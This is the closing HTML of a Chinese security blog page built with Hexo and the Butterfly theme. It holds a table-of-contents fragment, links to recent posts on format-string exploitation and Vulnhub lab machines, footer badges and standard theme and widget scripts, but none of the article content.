toc-level-5"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E5%A4%A7%E6%95%B0%E5%AD%97"><span class="toc-number">1.2.2.2.2.</span> <span class="toc-text">覆盖大数字</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/7fabda03/" title="格式化字符串"><img src="/img/fmt.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="格式化字符串"/></a><div class="content"><a class="title" href="/posts/7fabda03/" title="格式化字符串">格式化字符串</a><time datetime="2024-10-14T03:23:00.000Z" title="发表于 2024-10-14 11:23:00">2024-10-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/ee0929c4/" title="Vulnhub-Potato"><img src="/img/Potato.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vulnhub-Potato"/></a><div class="content"><a class="title" href="/posts/ee0929c4/" title="Vulnhub-Potato">Vulnhub-Potato</a><time datetime="2024-09-17T05:34:00.000Z" title="发表于 2024-09-17 13:34:00">2024-09-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3bdfdcb0/" title="Vulnhub-DC1"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vulnhub-DC1"/></a><div class="content"><a class="title" href="/posts/3bdfdcb0/" title="Vulnhub-DC1">Vulnhub-DC1</a><time datetime="2024-09-14T09:11:00.000Z" title="发表于 2024-09-14 17:11:00">2024-09-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/35045482/" title="Vulnhub-DC9"><img src="/img/baji2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vulnhub-DC9"/></a><div class="content"><a class="title" href="/posts/35045482/" title="Vulnhub-DC9">Vulnhub-DC9</a><time datetime="2024-09-06T12:36:20.000Z" title="发表于 2024-09-06 20:36:20">2024-09-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/ff3ef111/" title="Vulnhub靶机--AI-Web1"><img src="/img/BaJi.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vulnhub靶机--AI-Web1"/></a><div class="content"><a class="title" href="/posts/ff3ef111/" title="Vulnhub靶机--AI-Web1">Vulnhub靶机--AI-Web1</a><time datetime="2024-09-02T05:24:07.000Z" title="发表于 2024-09-02 13:24:07">2024-09-02</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/fmt.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2024 By Zs</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">I wish you to become your own sun, no need to rely on who's light.
+<p>
+  <a target="_blank" href="https://hexo.io/">
+    <img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为Hexo">
+  </a>&nbsp;
+  <a target="_blank" href="https://butterfly.js.org/">
+    <img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用butterfly">
+  </a>&nbsp;
+  <a target="_blank" href="https://www.jsdelivr.com/">
+    <img src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&logo=jsDelivr" title="本站使用JsDelivr为静态资源提供CDN加速">
+  </a>&nbsp;
+  <a target="_blank" href="https://vercel.com/">
+    <img src="https://img.shields.io/badge/Hosted-Vervel-brightgreen?style=flat&logo=Vercel" title="本站采用双线部署，默认线路托管于Vercel">
+  </a>&nbsp;
+  <a target="_blank" href="https://vercel.com/">
+    <img src="https://img.shields.io/badge/Hosted-Coding-0cedbe?style=flat&logo=Codio" title="本站采用双线部署，联通线路托管于Coding">
+  </a>&nbsp;
+  <a target="_blank" href="https://github.com/">
+    <img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由Github托管">
+  </a>&nbsp;
+  <a target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">
+    <img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可">
+  </a>
+</p>
+<script src="//code.tidio.co/igzcydyc0v4yli1cqhy75vfxpqucu4lm.js"></script>
+</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div><!-- hexo injector body_end start --><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '2s');
+    arr[i].setAttribute('data-wow-delay', '1s');
+    arr[i].setAttribute('data-wow-offset', '100');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script></div><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow_init.js"></script><!-- hexo injector body_end end --></body></html>
